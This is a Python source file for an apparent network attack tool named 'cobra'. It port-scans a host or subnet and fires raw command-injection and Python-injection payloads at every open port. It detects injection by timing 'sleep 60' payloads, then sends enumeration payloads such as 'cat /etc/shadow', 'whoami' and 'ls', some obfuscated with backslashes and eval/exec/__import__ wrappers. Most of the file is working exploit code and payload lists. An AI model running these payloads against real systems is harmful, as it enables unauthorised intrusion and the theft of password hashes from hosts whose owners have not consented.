import ipaddress
import re
import socket
import time
from TheSilent.clear import clear
from TheSilent.dolphin import dolphin

CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RED = "\033[1;31m"

def cobra(host,delay=0):
    hits = []

    mal_command = [r"sleep 60",
                   r"sleep \6\0"]

    mal_command_enumerate = [r"cat /etc/shadow",
                             r"cat \/\e\t\c/\s\h\ad\o\w",
                             r"ls -l -a",
                             r"\l\s",
                             r"pwd",
                             r"\p\w\d",
                             r"whoami",
                             r"\w\h\o\a\m\i"]

    mal_python = [r"time.sleep(60)",
                  r"eval(compile('import time\ntime.sleep(60)','cobra','exec'))",
                  r"eval(compile('import os\nos.system('sleep 60')','cobra','exec'))",
                  r"__import__('time').sleep(60)",
                  r"__import__('os').system('sleep 60')",
                  r'eval("__import__(\'time\').sleep(60)")',
                  r'eval("__import__(\'os\').system(\'sleep 60\')")',
                  r'exec("__import__(\'time\').sleep(60)")',
                  r'exec("__import__(\'os\').system(\'sleep 60\')")',
                  r'exec("import time\ntime.sleep(60)"',
                  r'exec("import os\nos.system(\'sleep 60\')")']

    mal_python_enumerate = [r"eval(compile('import os\nos.system('cat /etc/shadow')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('cat \/\e\t\c/\s\h\ad\o\w')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('ls -l -a')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('\l\s')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('pwd')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('\p\w\d')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('whoami')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('\w\h\o\a\m\i')','cobra','exec'))",
                            r"__import__('os').system('cat /etc/shadow')",
                            r"__import__('os').system('cat \/\e\t\c/\s\h\ad\o\w')",
                            r"__import__('os').system('ls -l -a')",
                            r"__import__('os').system('\l\s')",
                            r"__import__('os').system('pwd')",
                            r"__import__('os').system('\p\w\d')",
                            r"__import__('os').system('whoami')",
                            r"__import__('os').system('\w\h\o\a\m\i')",
                            r'eval("__import__(\'os\').system(\'cat /etc/shadow\')")',
                            r'eval("__import__(\'os\').system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
                            r'eval("__import__(\'os\').system(\'ls -l -a\')")',
                            r'eval("__import__(\'os\').system(\'\l\s\')")',
                            r'eval("__import__(\'os\').system(\'pwd\')")',
                            r'eval("__import__(\'os\').system(\'\p\w\d\')")',
                            r'eval("__import__(\'os\').system(\'whoami\')")',
                            r'eval("__import__(\'os\').system(\'\w\h\o\a\m\i\')")',
                            r'exec("__import__(\'os\').system(\'cat /etc/shadow\')")',
                            r'exec("__import__(\'os\').system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
                            r'exec("__import__(\'os\').system(\'ls -l -a\')")',
                            r'exec("__import__(\'os\').system(\'\l\s\')")',
                            r'exec("__import__(\'os\').system(\'pwd\')")',
                            r'exec("__import__(\'os\').system(\'\p\w\d\')")',
                            r'exec("__import__(\'os\').system(\'whoami\')")',
                            r'exec("__import__(\'os\').system(\'\w\h\o\a\m\i\')")',
                            r'exec("import os\nos.system(\'cat /etc/shadow\')")',
                            r'exec("import os\nos.system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
                            r'exec("import os\nos.system(\'ls -l -a\')")',
                            r'exec("import os\nos.system(\'\l\s\')")',
                            r'exec("import os\nos.system(\'pwd\')")',
                            r'exec("import os\nos.system(\'\p\w\d\')")',
                            r'exec("import os\nos.system(\'whoami\')")',
                            r'exec("import os\nos.system(\'\w\h\o\a\m\i\')")']

    mal_special = [r"\n",
                   r"\r",
                   r"\033[1;36m",
                   r"\033[0;32m",
                   r"\033[1;31m",
                   r"\U0001F600",
                   r"\U0001F47C",
                   r"\U0001F525"]

    clear()
    
    # subnet
    if re.search("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$",host):
        subnet = list(ipaddress.ip_network(host,strict=False).hosts())
        for ip in subnet:
            ip = str(ip)
            print(CYAN + f"port scanning {ip}")
            time.sleep(delay)
            ports = dolphin(ip)
            for port in ports:
                print(CYAN + f"checking: {ip}:{port}")
                for mal in mal_command:
                    time.sleep(delay)
                    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tcp_socket.settimeout(120)
                    try:
                        tcp_socket.connect((ip, port))
                        tcp_socket.send(mal.encode())
                        start = time.time()
                        data = tcp_socket.recv(65535)
                        end = time.time()
                        if end - start >= 45:
                            for mal_enum in mal_command_enumerate:
                                time.sleep(delay)
                                tcp_socket.send(mal_enum.encode())
                                data = tcp_socket.recv(65535)
                                tcp_socket.close()
                                if len(data) > 0:
                                    hits.append(f"command injection on host {ip} in port {port}:{mal_enum}- {data}")

                        tcp_socket.close()

                    except:
                        pass

                for mal in mal_python:
                    time.sleep(delay)
                    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tcp_socket.settimeout(120)
                    try:
                        tcp_socket.connect((ip, port))
                        tcp_socket.send(mal.encode())
                        start = time.time()
                        data = tcp_socket.recv(65535)
                        end = time.time()
                        if end - start >= 45:
                            for mal_enum in mal_python_enumerate:
                                time.sleep(delay)
                                tcp_socket.send(mal_enum.encode())
                                data = tcp_socket.recv(65535)
                                if len(data) > 0:
                                    hits.append(f"python injection on host {ip} in port {port}:{mal_enum}- {data}")

                        tcp_socket.close()

                    except:
                        pass

                for mal in mal_special:
                    time.sleep(delay)
                    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    tcp_socket.settimeout(15)
                    try:
                        tcp_socket.connect((ip, port))
                        tcp_socket.send(mal.encode())
                        data = tcp_socket.recv(65535)
                        tcp_socket.close()
                        hits.append(f"recieved data with payload {ip} on host {host} in port {port}: {data}")

                    except:
                        pass

    # single host  
    else:
        print(CYAN + "port scanning")
        ports = dolphin(host)
        for port in ports:
            print(CYAN + f"checking: {port}")
            for mal in mal_command:
                time.sleep(delay)
                tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_socket.settimeout(120)
                try:
                    tcp_socket.connect((host, port))
                    tcp_socket.send(mal.encode())
                    start = time.time()
                    data = tcp_socket.recv(65535)
                    end = time.time()
                    if end - start >= 45:
                        for mal_enum in mal_command_enumerate:
                            time.sleep(delay)
                            tcp_socket.send(mal_enum.encode())
                            data = tcp_socket.recv(65535)
                            tcp_socket.close()
                            if len(data) > 0:
                                hits.append(f"command injection in port {port}:{mal_enum}- {data}")

                    tcp_socket.close()

                except:
                    pass

            for mal in mal_python:
                time.sleep(delay)
                tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_socket.settimeout(120)
                try:
                    tcp_socket.connect((host, port))
                    tcp_socket.send(mal.encode())
                    start = time.time()
                    data = tcp_socket.recv(65535)
                    end = time.time()
                    if end - start >= 45:
                        for mal_enum in mal_python_enumerate:
                            time.sleep(delay)
                            tcp_socket.send(mal_enum.encode())
                            data = tcp_socket.recv(65535)
                            if len(data) > 0:
                                hits.append(f"python injection in port {port}:{mal_enum}- {data}")

                    tcp_socket.close()

                except:
                    pass

            for mal in mal_special:
                time.sleep(delay)
                tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tcp_socket.settimeout(15)
                try:
                    tcp_socket.connect((host, port))
                    tcp_socket.send(mal.encode())
                    data = tcp_socket.recv(65535)
                    tcp_socket.close()
                    hits.append(f"recieved data with payload {mal} on port {port}: {data}")

                except:
                    pass

    clear()
    hits = list(set(hits[:]))
    hits.sort()

    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)

    else:
        print(GREEN + f"we didn't find anything interesting on {host}")
